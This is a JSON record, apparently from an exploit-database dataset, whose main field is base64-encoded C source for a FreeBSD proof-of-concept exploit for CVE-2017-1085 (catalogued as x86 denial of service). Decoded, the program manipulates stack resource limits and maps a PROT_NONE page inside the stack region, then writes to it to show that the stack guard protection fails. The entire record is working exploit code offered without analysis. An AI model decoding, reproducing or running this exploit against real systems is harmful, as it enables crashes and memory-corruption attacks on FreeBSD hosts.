{
    "source": "exploit-database", 
    "exploit": "LyoNCiAqIEZyZWVCU0RfQ1ZFLTIwMTctMTA4NS5jDQogKiBDb3B5cmlnaHQgKEMpIDIwMTcgUXVhbHlzLCBJbmMuDQogKg0KICogVGhpcyBwcm9ncmFtIGlzIGZyZWUgc29mdHdhcmU6IHlvdSBjYW4gcmVkaXN0cmlidXRlIGl0IGFuZC9vciBtb2RpZnkNCiAqIGl0IHVuZGVyIHRoZSB0ZXJtcyBvZiB0aGUgR05VIEdlbmVyYWwgUHVibGljIExpY2Vuc2UgYXMgcHVibGlzaGVkIGJ5DQogKiB0aGUgRnJlZSBTb2Z0d2FyZSBGb3VuZGF0aW9uLCBlaXRoZXIgdmVyc2lvbiAzIG9mIHRoZSBMaWNlbnNlLCBvcg0KICogKGF0IHlvdXIgb3B0aW9uKSBhbnkgbGF0ZXIgdmVyc2lvbi4NCiAqDQogKiBUaGlzIHByb2dyYW0gaXMgZGlzdHJpYnV0ZWQgaW4gdGhlIGhvcGUgdGhhdCBpdCB3aWxsIGJlIHVzZWZ1bCwNCiAqIGJ1dCBXSVRIT1VUIEFOWSBXQVJSQU5UWTsgd2l0aG91dCBldmVuIHRoZSBpbXBsaWVkIHdhcnJhbnR5IG9mDQogKiBNRVJDSEFOVEFCSUxJVFkgb3IgRklUTkVTUyBGT1IgQSBQQVJUSUNVTEFSIFBVUlBPU0UuICBTZWUgdGhlDQogKiBHTlUgR2VuZXJhbCBQdWJsaWMgTGljZW5zZSBmb3IgbW9yZSBkZXRhaWxzLg0KICoNCiAqIFlvdSBzaG91bGQgaGF2ZSByZWNlaXZlZCBhIGNvcHkgb2YgdGhlIEdOVSBHZW5lcmFsIFB1YmxpYyBMaWNlbnNlDQogKiBhbG9uZyB3aXRoIHRoaXMgcHJvZ3JhbS4gIElmIG5vdCwgc2VlIDxodHRwOi8vd3d3LmdudS5vcmcvbGljZW5zZXMvPi4NCiAqLw0KDQojaW5jbHVkZSA8c3RkaW50Lmg+DQojaW5jbHVkZSA8c3RkaW8uaD4NCiNpbmNsdWRlIDxzdGRsaWIuaD4NCiNpbmNsdWRlIDxzeXMvbW1hbi5oPg0KI2luY2x1ZGUgPHN5cy9yZXNvdXJjZS5oPg0KI2luY2x1ZGUgPHN5cy90aW1lLmg+DQojaW5jbHVkZSA8dW5pc3RkLmg+DQoNCiNkZWZpbmUgZGllKCkgZG8geyBcDQogICAgZnByaW50ZihzdGRlcnIsICJkaWVkIGluICVzOiAldVxuIiwgX19mdW5jX18sIF9fTElORV9fKTsgXA0KICAgIGV4aXQoRVhJVF9GQUlMVVJFKTsgXA0KfSB3aGlsZSAoMCkNCg0KaW50DQptYWluKGNvbnN0IGludCBhcmdjLCBjaGFyICogY29uc3QgYXJndltdKQ0Kew0KICAgIHN0YXRpYyBjb25zdCBzdHJ1Y3QgcmxpbWl0IGNvcmU7DQogICAgaWYgKHNldHJsaW1pdChSTElNSVRfQ09SRSwgJmNvcmUpKSBkaWUoKTsNCg0KICAgIHN0cnVjdCBybGltaXQgc3RhY2s7DQogICAgaWYgKGdldHJsaW1pdChSTElNSVRfU1RBQ0ssICZzdGFjaykpIGRpZSgpOw0KICAgIGlmIChzdGFjay5ybGltX2N1ciA+IHN0YWNrLnJsaW1fbWF4IC8gMykgew0KICAgICAgICBzdGFjay5ybGltX2N1ciA9IHN0YWNrLnJsaW1fbWF4IC8gMzsNCiAgICAgICAgaWYgKHNldHJsaW1pdChSTElNSVRfU1RBQ0ssICZzdGFjaykpIGRpZSgpOw0KICAgICAgICBleGVjdmUoKmFyZ3YsIGFyZ3YsIE5VTEwpOw0KICAgICAgICBkaWUoKTsNCiAgICB9DQogICAgY2hhciAqIHByb3Rfbm9uZSA9IE5VTEw7DQogICAgZm9yICg7Oykgew0KICAgICAgICBwcm90X25vbmUgPSBtbWFwKE5VTEwsIDQwOTYsIFBST1RfTk9ORSwgTUFQX1BSSVZBVEUgfCBNQVBfQU5PTllNT1VTLCAtMSwgMCk7DQogICAgICAgIGlmIChwcm90X25vbmUgPT0gTUFQX0ZBSUxFRCkgZGllKCk7DQogICAgICAgIGlmICgodWludHB0cl90KSZzdGFjayA8ICh1aW50cHRyX3QpcHJvdF9ub25lKSBkaWUoKTsNCiAgICAgICAgaWYgKCh1aW50cHRyX3QpJnN0YWNrIC0gKHVpbnRwdHJfdClwcm90X25vbmUgPCBzdGFjay5ybGltX21heCAvIDMgKiAyKSBicmVhazsNCiAgICB9DQogICAgaWYgKGFyZ2MgPiAxKSB7DQogICAgICAgIHN0YWNrLnJsaW1fY3VyID0gc3RhY2sucmxpbV9tYXg7DQogICAgICAgIGlmIChzZXRybGltaXQoUkxJTUlUX1NUQUNLLCAmc3RhY2spKSBkaWUoKTsNCiAgICB9DQogICAgKnByb3Rfbm9uZSA9ICdBJzsNCiAgICBwcmludGYoImNoYXIgYXQgJXA6ICUwMnhcbiIsIHByb3Rfbm9uZSwgKnByb3Rfbm9uZSk7DQogICAgZXhpdChFWElUX1NVQ0NFU1MpOw0KfQ==", 
    "filename": "platforms/freebsd_x86/dos/42279.c", 
    "id": "42279", 
    "cves": [
        "CVE-2017-1085"
    ]
}